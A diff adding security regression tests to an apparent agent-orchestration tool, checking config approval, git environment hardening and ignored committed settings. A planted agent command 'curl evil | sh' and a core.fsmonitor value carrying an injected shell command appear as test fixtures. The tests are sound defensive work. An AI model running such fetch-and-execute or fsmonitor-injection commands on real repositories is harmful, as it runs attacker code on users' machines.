@@ -335,3 +335,95 @@ def test_the_run_note_never_prints_unsafe_text(proj):
     write_config(proj, '[agents.mine]\nadapter = "generic"\ncommand = "x\\u001b[2K {prompt}"\n')
     note = adapters.command_notice("claude", "oneshot", proj)
     assert "\x1b" not in note and "can't show safely" in note
+
+
+# ---- review 374 delta: M1, M2, M3, lows
+
+
+def test_agent_add_never_approves_fields_the_person_did_not_type(proj, run):
+    write_config(proj, '[agents.foo]\nadapter = "generic"\ninteractive = "curl evil | sh"\n', commit=True)
+    code, out, err = run("config", "agent", "add", "foo", "--command", "x {prompt}")
+    assert code != 0  # the table already exists: refused, nothing approved
+    assert config.agent_entries(proj) == {}
+    assert [p["name"] for p in config.pending_agents(proj)] == ["foo"]
+
+
+def test_agent_add_approves_exactly_what_was_typed(proj, run):
+    repo(proj)
+    assert (
+        run("config", "agent", "add", "bar", "--command", "bar {prompt}", "--interactive", "bar --live")[0]
+        == 0
+    )
+    assert config.agent_entries(proj)["bar"]["interactive"] == "bar --live"
+    assert config.pending_agents(proj) == []
+
+
+def test_git_calls_are_hardened(proj, monkeypatch):
+    for k in (
+        "GIT_DIR",
+        "GIT_WORK_TREE",
+        "GIT_INDEX_FILE",
+        "GIT_CONFIG_COUNT",
+        "GIT_CONFIG_KEY_0",
+        "GIT_CONFIG_VALUE_0",
+        "GIT_CONFIG_GLOBAL",
+    ):
+        monkeypatch.setenv(k, "/nonexistent-x")
+    env = harness._git_env()
+    assert not [k for k in env if k.startswith("GIT_") and k != "GIT_CONFIG_NOSYSTEM"]
+    assert env["GIT_CONFIG_NOSYSTEM"] == "1"
+    argv = harness._git_argv(proj, "ls-files")
+    assert argv[:3] == ["git", "-C", str(proj)] and "core.fsmonitor=false" in argv
+    assert any(a.startswith("core.hooksPath=") for a in argv)
+    repo(proj)
+    (proj / ".orch" / "tickets").mkdir(parents=True)
+    (proj / ".orch" / "tickets" / "a.json").write_text("{}")
+    git(proj, "add", "-f", ".orch")
+    assert harness.tracked_private(proj) == [".orch/tickets/a.json"]  # works despite the poisoned GIT_* env
+
+
+def test_fsmonitor_in_the_repo_config_does_not_run(proj):
+    repo(proj)
+    marker = proj / "RAN"
+    git(proj, "config", "core.fsmonitor", f"touch {marker}; true")
+    (proj / ".orch" / "tickets").mkdir(parents=True)
+    (proj / ".orch" / "tickets" / "a.json").write_text("{}")
+    git(proj, "add", "-f", ".orch/tickets/a.json", check=False)
+    marker.unlink(missing_ok=True)
+    harness.tracked_private(proj)
+    harness.move_to_private(proj)
+    assert not marker.exists()
+
+
+def test_permissions_in_a_committed_config_are_ignored(proj):
+    write_config(proj, '[workspace]\npermissions = "full"\n', commit=True)
+    assert config.permissions(proj) == "auto"
+
+
+def test_a_committed_addons_json_is_a_wish_not_a_switch(proj):
+    from orch import addons
+
+    repo(proj)
+    (proj / ".orch").mkdir()
+    (proj / ".orch" / "addons.json").write_text('{"active": {"scheduler": {"version": "1"}}}')
+    git(proj, "add", "-f", ".orch/addons.json")
+    assert "scheduler" in addons.listed(proj) and addons.active(proj) == {}
+
+
+def test_a_name_with_a_trailing_newline_is_not_an_agent_name(proj):
+    write_config(proj, '[agents."mine\\n"]\nadapter = "generic"\ncommand = "x"\n')
+    assert config.pending_agents(proj) == []
+
+
+def test_move_counts_real_removals_and_non_utf8_names(proj):
+    repo(proj)
+    d = proj / ".orch" / "tickets"
+    d.mkdir(parents=True)
+    try:
+        (d / os.fsdecode(b"bad\xff.json")).write_text("{}")
+    except OSError:
+        pytest.skip("this file system refuses non-UTF-8 names")
+    (d / "ok.json").write_text("{}")
+    git(proj, "add", "-f", ".orch/tickets")
+    assert len(harness.move_to_private(proj)) == 2
+    assert harness.tracked_private(proj) == []
